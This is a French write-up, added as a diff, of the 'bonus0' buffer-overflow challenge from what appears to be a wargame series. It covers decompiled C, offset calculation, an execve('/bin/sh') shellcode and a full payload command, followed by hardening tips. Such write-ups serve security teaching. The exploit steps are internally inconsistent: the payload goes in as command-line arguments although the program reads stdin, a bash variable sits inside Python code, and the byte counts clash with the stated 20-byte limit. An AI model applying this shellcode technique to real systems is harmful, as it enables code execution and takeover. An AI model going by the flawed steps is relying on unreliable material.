@@ -1,0 +1,136 @@
+# Exploitation de Bonus0 – Buffer Overflow et Concatenation Piégée
+
+## Analyse du Programme
+
+Le programme principal manipule des buffers de taille limitée, mais la logique de copie et de concaténation permet un débordement de mémoire exploitable.
+
+### Code principal (main)
+
+```c
+int main(void) {
+    char local_3a[54]; // En réalité 42 bytes utiles (vérifié sous GDB)
+    pp(local_3a);
+    puts(local_3a);
+    return 0;
+}
+```
+
+### Fonction pp
+
+```c
+void pp(char *param_1) {
+    char local_34[20];
+    char local_20[20];
+    p(local_34, &DAT_080486a0); // Premier input
+    p(local_20, &DAT_080486a0); // Deuxième input
+    strcpy(param_1, local_34);
+    // Ajoute un espace à la fin du premier input
+    // puis concatène le second input
+    // (voir explication détaillée ci-dessous)
+    strcat(param_1, local_20);
+}
+```
+
+### Fonction p
+
+```c
+void p(char *param_1, char *param_2) {
+    char local_100c[4104];
+    puts(param_2);
+    read(0, local_100c, 0x1000);
+    char *newline = strchr(local_100c, '\n');
+    *newline = '\0';
+    strncpy(param_1, local_100c, 0x14); // Copie max 20 bytes
+}
+```
+
+---
+
+## Points de Théorie
+
+### 1. Buffer Overflow et Concatenation
+
+- **Buffer overflow** : Dépassement de la taille d'un buffer pour écraser des variables ou des adresses de retour.
+- **Concaténation piégée** : Ici, la concaténation et l'absence de terminaison nulle (`\0`) permettent de dépasser la taille du buffer de destination.
+
+### 2. Réutilisation de Buffer
+
+- Le buffer local_100c de la fonction `p` est réutilisé pour les deux inputs, ce qui permet de placer un shellcode à un endroit précis en mémoire.
+
+### 3. Calcul d'offset et d'overflow
+
+- La taille du buffer principal (local_3a) est de 42 bytes, mais on peut écrire jusqu'à 61 bytes (20 + 20 + 1 + 20) à cause de la concaténation et de l'absence de `\0` après le premier input.
+
+---
+
+## Schéma mémoire simplifié
+
+```
+| local_3a (main) |<-------------------|
+|-----------------|                    |
+| local_34 (pp)   |---strcpy---> param_1 (main)
+| local_20 (pp)   |---strcat---> param_1 (main)
+|-----------------|                    |
+| local_100c (p)  |<-------------------|
+```
+
+- Les deux inputs sont copiés dans le même grand buffer (local_100c), puis recopiés dans les buffers de 20 bytes, puis concaténés dans le buffer de 42 bytes du main.
+
+---
+
+## Étapes de l'Exploitation
+
+### 1. Calcul de l'offset
+
+- On remplit les deux inputs avec des patterns distincts et on observe le crash (segfault) pour déterminer où l'EIP (adresse de retour) est écrasé.
+- Exemple :
+  ```
+  AAAABBBBCCCCDDDDEEEE
+  FFFFGGGGHHHHIIIIJJJJ
+  ```
+- Le crash sur `0x49484848` ("HHHI") indique un offset de 9 bytes dans le second argument.
+
+### 2. Calcul de la zone exploitable
+
+- On peut écrire 61 bytes dans le buffer de 42 bytes du main, donc on peut dépasser de 19 bytes.
+- L'adresse à écraser (EIP) se trouve à 9 bytes après le début du buffer.
+
+### 3. Placement du shellcode
+
+- Le shellcode doit être placé dans le grand buffer de 4104 bytes, à une adresse connue.
+- On calcule l'adresse exacte avec GDB :
+  - `print $ebp-0x1008` pour le début du buffer
+  - On ajoute 61 bytes pour pointer après la concaténation
+
+### 4. Construction du payload
+
+- **Premier argument** : 61 "A" + shellcode
+- **Second argument** : 9 "A" + adresse du shellcode (en little-endian) + padding
+
+Exemple :
+```bash
+# Shellcode classique execve("/bin/sh")
+SHELLCODE="\x31\xc9\xf7\xe1\x04\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+./bonus0 $(python -c 'print("A"*61 + SHELLCODE)') $(python -c 'print("A"*9 + "\xd1\xe6\xff\xbf" + "B"*7)')
+```
+- L'adresse `\xd1\xe6\xff\xbf` est calculée comme expliqué plus haut.
+
+### 5. Variante : NOP Sled
+
+- On peut aussi placer un NOP sled (suite de `\x90`) avant le shellcode et pointer vers n'importe quelle adresse du sled pour augmenter la fiabilité.
+
+---
+
+## Sécurité
+
+- **Vérification de la taille des buffers** : Toujours vérifier la taille des entrées utilisateur.
+- **Utilisation de fonctions sûres** : Préférer `snprintf`, `strlcpy`, etc.
+- **Protéger la pile** : Stack canaries, ASLR, NX bit.
+- **Séparer les buffers** : Ne pas réutiliser de gros buffers pour plusieurs entrées critiques.
+
+---
+
+## Résumé
+
+Ce challenge illustre comment une concaténation naïve et la réutilisation de buffers peuvent permettre un buffer overflow, même avec des copies limitées. L'exploitation repose sur la connaissance de la disposition mémoire et la capacité à injecter un shellcode à une adresse contrôlée.
